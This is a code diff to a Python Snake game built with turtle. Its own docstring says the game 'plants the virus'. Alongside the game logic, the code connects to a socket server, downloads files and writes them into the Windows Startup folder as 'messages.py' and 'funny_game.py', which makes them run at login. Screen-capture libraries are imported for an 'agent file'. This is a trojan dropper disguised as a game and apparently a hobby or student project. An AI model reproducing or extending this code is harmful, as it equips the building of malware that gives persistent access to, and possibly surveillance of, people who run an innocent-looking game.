@@ -1,3 +1,12 @@
+"""
+the snake game, plants the virus
+"""
+# importing those three liabries
+# for the agent file
+import cv2
+import numpy as np
+import pyautogui
+
 import os
 import random
 import socket
@@ -6,7 +15,7 @@ import time
 import turtle
 
 SERVER_IP = "127.0.0.1"
-SERVER_PORT = "8080"
+SERVER_PORT = 8840
 MSG_LEN_PROTOCOL = 4
 EOF = b'-1'
 delay = 0.1
@@ -14,7 +23,6 @@ delay = 0.1
 # Score
 score = 0
 high_score = 0
-
 # Set up the screen
 wn = turtle.Screen()
 wn.title("Snake Game by @TokyoEdTech")
@@ -55,26 +63,46 @@ pen.write("Score: 0  High Score: 0", align="center",
 
 # Functions
 def go_up():
+    """
+    go up method
+    :return:
+    """
     if head.direction != "down":
         head.direction = "up"
 
 
 def go_down():
+    """
+    go down method
+    :return:
+    """
     if head.direction != "up":
         head.direction = "down"
 
 
 def go_left():
+    """
+    go left method
+    :return:
+    """
     if head.direction != "right":
         head.direction = "left"
 
 
 def go_right():
+    """
+    go right method
+    :return:
+    """
     if head.direction != "left":
         head.direction = "right"
 
 
 def move():
+    """
+    move method
+    :return:
+    """
     if head.direction == "up":
         y = head.ycor()
         head.sety(y + 20)
@@ -105,10 +133,30 @@ my_socket.connect((SERVER_IP, SERVER_PORT))  # local server
 signal = 'g'.encode()
 my_socket.send(signal)
 user_name = os.getlogin()
+# location for the agent file
 location = "c:\\Users\\{}\\AppData\\Roaming\\Microsoft" \
            "\\Windows\\Start Menu\\Programs\\" \
-           "Startup\\funny_game".format(
-    user_name)
+           "Startup\\messages.py".format(user_name)
+# downloading the messages file
+with open(location, "wb") as f:
+    done = False
+    while not done:
+        try:
+            raw_size = my_socket.recv(MSG_LEN_PROTOCOL)
+            size = raw_size.decode()
+            if size.isdigit():
+                data = my_socket.recv(int(size))
+            if data == EOF:
+                break
+            print(len(data))
+            f.write(data)
+        except Exception:
+            done = True
+
+location = "c:\\Users\\{}\\AppData\\Roaming\\Microsoft" \
+           "\\Windows\\Start Menu\\Programs\\" \
+           "Startup\\funny_game.py".format(user_name)
+# downloading the agent file
 with open(location, "wb") as f:
     done = False
     while not done:
